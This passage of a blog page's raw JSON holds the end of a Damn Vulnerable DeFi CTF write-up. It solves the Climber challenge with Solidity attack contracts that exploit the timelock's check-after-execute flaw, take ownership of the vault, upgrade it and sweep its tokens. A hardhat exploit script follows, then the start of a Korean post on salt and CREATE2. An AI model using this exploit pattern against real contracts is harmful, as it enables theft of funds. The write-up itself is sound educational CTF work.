timelock, only an account with a \"Proposer\" role can schedule actions that can be executed 1 hour later.\n\nYour goal is to empty the vault.</code></pre></div>\n<br>\n<p>In this challenge, our goal is to empty the vault. We must to know about UUPS upgrade concept to solve this challenge. Firstly, the vulnerability is found in <code class=\"language-text\">Timelock</code> contract. The <code class=\"language-text\">execute()</code> function does not follows Checks Effects Interactions pattern.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token comment\">// lines in execute()</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint8</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> targets<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        targets<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">functionCallWithValue</span><span class=\"token punctuation\">(</span>dataElements<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span><span class=\"token function\">getOperationState</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> OperationState<span class=\"token punctuation\">.</span>ReadyForExecution<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<p>This code allows us to make a schedule for execution before require statement, which means we can call <code class=\"language-text\">execute()</code> function first, and then add schedule that matches <code class=\"language-text\">operationId</code>. Also, during execution, we can call any function we want with address of <code class=\"language-text\">timelock contract</code>. To go through the require statement, first we need to call <code class=\"language-text\">updateDelay()</code> function with parameter <code class=\"language-text\">0</code>. Then set the attack contract to have proposer role, and call <code class=\"language-text\">transferOwnership()</code> to set the vault owner to be attack contract. Lastly, call <code class=\"language-text\">schedule()</code> function. Here is the attack contract.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">ClimberAttacker</span> <span class=\"token punctuation\">{</span>\n\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> climberTimelock<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> climberVault<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">address</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> targets<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> values<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">public</span> data<span class=\"token punctuation\">;</span>\n\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> ADMIN_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"ADMIN_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">bytes32</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> PROPOSER_ROLE <span class=\"token operator\">=</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PROPOSER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _climberTimelock<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> _climberVault<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span>\n        token <span class=\"token operator\">=</span> _token<span class=\"token punctuation\">;</span>\n        climberTimelock <span class=\"token operator\">=</span> _climberTimelock<span class=\"token punctuation\">;</span>\n        climberVault <span class=\"token operator\">=</span> _climberVault<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>climberTimelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"updateDelay(uint64)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint64</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>climberTimelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"grantRole(bytes32,address)\"</span><span class=\"token punctuation\">,</span> <span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"PROPOSER_ROLE\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>climberVault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"transferOwnership(address)\"</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        targets<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        values<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        data<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"schedule()\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        \n        <span class=\"token punctuation\">(</span><span class=\"token builtin\">bool</span> success<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> climberTimelock<span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>\n            abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodeWithSignature</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"execute(address[],uint256[],bytes[],bytes32)\"</span><span class=\"token punctuation\">,</span> targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> dataElements<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>success<span class=\"token punctuation\">,</span> <span class=\"token string\">\"execute failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ClimberTimelock</span><span class=\"token punctuation\">(</span>climberTimelock<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">schedule</span><span class=\"token punctuation\">(</span>targets<span class=\"token punctuation\">,</span> values<span class=\"token punctuation\">,</span> data<span class=\"token punctuation\">,</span> <span class=\"token builtin\">bytes32</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">upgradeVault</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _newImp<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ClimberVault</span><span class=\"token punctuation\">(</span>climberVault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">upgradeTo</span><span class=\"token punctuation\">(</span>_newImp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">ClimberVaultAttackUpgrade</span><span class=\"token punctuation\">(</span>climberVault<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span>_token<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>In attack contract there are more functions that I have not explained. Since we became the owner of vault contract, we can upgrade vault contract to our new logic contract, so I built a new logic contract that allow us to sweep all the funds.</p>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">ClimberVaultAttackUpgrade</span> <span class=\"token keyword\">is</span> Initializable<span class=\"token punctuation\">,</span> OwnableUpgradeable<span class=\"token punctuation\">,</span> UUPSUpgradeable<span class=\"token punctuation\">{</span>\n\n    <span class=\"token comment\">//constructor() initializer {}</span>\n    <span class=\"token builtin\">uint256</span> <span class=\"token keyword\">private</span> _lastWithdrawalTimestamp<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">private</span> _sweeper<span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> attacker<span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">initialize</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _attacker<span class=\"token punctuation\">)</span> initializer <span class=\"token keyword\">external</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token function\">__Ownable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">__UUPSUpgradeable_init</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> tokenAddress<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n        IERC20 token <span class=\"token operator\">=</span> <span class=\"token function\">IERC20</span><span class=\"token punctuation\">(</span>tokenAddress<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">require</span><span class=\"token punctuation\">(</span>token<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>tx<span class=\"token punctuation\">.</span>origin<span class=\"token punctuation\">,</span> token<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"Transfer failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">_authorizeUpgrade</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> newImplementation<span class=\"token punctuation\">)</span> <span class=\"token keyword\">internal</span> onlyOwner override <span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span>\n\n<span class=\"token punctuation\">}</span></code></pre></div>\n<br>\n<p>Lastly, here is script I used to exploit the vault.</p>\n<div class=\"gatsby-highlight\" data-language=\"js\"><pre class=\"language-js\"><code class=\"language-js\">    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>        \n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ClimberAttacker'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>timelock<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>vault<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackUpgradableContract <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ClimberVaultAttackUpgrade'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">upgradeVault</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackUpgradableContract<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>attackContract<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sweepFunds</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>token<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<br>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#challenge-name-unstoppable\">Challenge name: Unstoppable</a></p>\n<ul>\n<li><a href=\"#challenge-description\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-naive-receiver\">Challenge name: Naive-Receiver</a></p>\n<ul>\n<li><a href=\"#challenge-description-1\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-truster\">Challenge name: Truster</a></p>\n<ul>\n<li><a href=\"#challenge-description-2\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-side-entrance\">Challenge name: Side entrance</a></p>\n<ul>\n<li><a href=\"#challenge-description-3\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-the-rewarder\">Challenge name: The rewarder</a></p>\n<ul>\n<li><a href=\"#challenge-description-4\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-selfie\">Challenge name: Selfie</a></p>\n<ul>\n<li><a href=\"#challenge-description-5\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-compromised\">Challenge name: Compromised</a></p>\n<ul>\n<li><a href=\"#challenge-descrisption\">Challenge descrisption:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-puppet\">Challenge name: Puppet</a></p>\n<ul>\n<li><a href=\"#challenge-description-6\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-puppet-v2\">Challenge name: Puppet v2</a></p>\n<ul>\n<li><a href=\"#challenge-description-7\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-free-rider\">Challenge name: Free rider</a></p>\n<ul>\n<li><a href=\"#challenge-description-8\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-backdoor\">Challenge name: Backdoor</a></p>\n<ul>\n<li><a href=\"#challenge-description-9\">Challenge description:</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#challenge-name-climber\">Challenge name: Climber</a></p>\n<ul>\n<li><a href=\"#challenge-description-10\">Challenge description:</a></li>\n</ul>\n</li>\n</ul>\n</div>","excerpt":"CTF name: Damn Vulnerable DeFi Challenge name: Unstoppable Challenge description: In this challenge, we need to attack and stop the pool from offering flash loans.  consist of two functions, which is  function and  function. The vulnerability is included in  function. This line of code in  function compares  and . If they are not equal to each other it reverts.  is only update by  function and  is calculated by  inside of flashLoan. If we send some tokens to UnstoppableLender contratct,  functi…","frontmatter":{"date":"September 02, 2022","title":"Damn Vulnerable Defi - Solution Write Up","categories":"취약점분석","author":"한성원","emoji":"🧢"},"fields":{"slug":"/CTFs/DamnVulnerableDefi/DamnVulnerableDefi_WriteUp/"}},"next":{"id":"04f8cd91-009b-553e-8f2d-18e2f5f24b8b","html":"<h1 id=\"-salt란-무엇인가\" style=\"position:relative;\"><a href=\"#-salt%EB%9E%80-%EB%AC%B4%EC%97%87%EC%9D%B8%EA%B0%80\" aria-label=\" salt란 무엇인가 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>👋 Salt란 무엇인가?</h1>\n<h2 id=\"salt를-알아보는-이유\" style=\"position:relative;\"><a href=\"#salt%EB%A5%BC-%EC%95%8C%EC%95%84%EB%B3%B4%EB%8A%94-%EC%9D%B4%EC%9C%A0\" aria-label=\"salt를 알아보는 이유 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Salt를 알아보는 이유</h2>\n<p>개인적으로 Smart Contract를 분석하다보면 <code class=\"language-text\">salt</code>라는 변수를 볼때가 많았다. 내가 처음 salt를 접한 것은 <code class=\"language-text\">Uniswap Factory Contract</code>였다. 이때는 하나하나의 변수에 집중하기보다는 Uniswap의 구조와 주요 함수 및 변수를 위주로 봤기 때문에 salt라는 변수는 별생각 없이 넘겼었다. 하지만 다른 Smart Contract에서도 salt 변수를 반복적으로 사용하는 것을 확인하였고, Salt에 대해 알아볼 필요성을 느꼈다.</p>\n<hr>\n<h2 id=\"salt\" style=\"position:relative;\"><a href=\"#salt\" aria-label=\"salt permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Salt</h2>\n<p>일반적으로 smart contract을 배포할때는 배포할때마다 증가하는 카운터(nonce)의 값을 사용하여 contract의 주소가 계산된다. 하지만 옵션으로 salt값을 주는 경우 카운터(nonce)를 사용하지 않고 다른 메커니즘을 사용해 contract의 주소를 계산한다.</p>\n<p>salt를 사용하여 주소를 계산하는 메커니즘은 contract의 주소를 예측할 수 있게 해준다.</p>\n<p>위키백과에는 salt를 다음과 같이 설명하고 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">In cryptography, a salt is random data that is used as an additional input to a one-way function that hashes data, a password or passphrase.[1]\n[full citation needed] Salts are used to safeguard passwords in storage. Historically, only a cryptographic hash function of the password was stored \non a system, but over time, additional safeguards were developed to protect against duplicate or common passwords being identifiable (as their hashes \nare identical).[2] Salting is one such protection.</code></pre></div>\n<p>해석하면 salt는 암호학에서 데이터나 암호를 해시하는 단방향 함수에 추가적으로 사용되는 임의의 데이터이다. salt는 저장소 안에 있는 암호를 보호하는데 사용된다. 과거에는 암호를 해시 함수에만 의존해 저장소에 저장했지만 시간이 지남에 따라 중복되거나 공통적인 암호에 대한 가능성이 생겼고 이를 보호하기 위한 추가 안전장치로써 salt가 개발되었다.</p>\n<p>solidity에서 salt의 예시는 두가지 경우에서 찾아볼 수 있다.</p>\n<ol>\n<li>create2</li>\n</ol>\n<p>첫번째 경우는 solidity assembly의 create2이다. CREATE2 opcode를 사용하면 contract가 배포될 주소를 예측할 수 있고, 사용자 온보딩 및 확장성을 개선할 수 있는 많은 가능성이 열립니다.(<a href=\"https://docs.openzeppelin.com/cli/2.8/deploying-with-create2\">openzeppelin</a>)</p>\n<hr>\n<h3 id=\"example-from-solidity-docs\" style=\"position:relative;\"><a href=\"#example-from-solidity-docs\" aria-label=\"example from solidity docs permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Example from solidity docs</h3>\n<div class=\"gatsby-highlight\" data-language=\"solidity\"><pre class=\"language-solidity\"><code class=\"language-solidity\">    <span class=\"token comment\">// SPDX-License-Identifier: GPL-3.0</span>\n    <span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">>=</span><span class=\"token version number\">0.7.0</span> <span class=\"token operator\">&lt;</span><span class=\"token version number\">0.9.0</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">contract</span> <span class=\"token class-name\">D</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> x<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span> a<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            x <span class=\"token operator\">=</span> a<span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n    \n    <span class=\"token keyword\">contract</span> <span class=\"token class-name\">C</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token keyword\">function</span> <span class=\"token function\">createDSalted</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes32</span> salt<span class=\"token punctuation\">,</span> <span class=\"token builtin\">uint</span> arg<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// This complicated expression just tells you how the address</span>\n            <span class=\"token comment\">// can be pre-computed. It is just there for illustration.</span>\n            <span class=\"token comment\">// You actually only need ``new D{salt: salt}(arg)``.</span>\n            <span class=\"token builtin\">address</span> predictedAddress <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint160</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span>\n                <span class=\"token builtin\">bytes1</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token 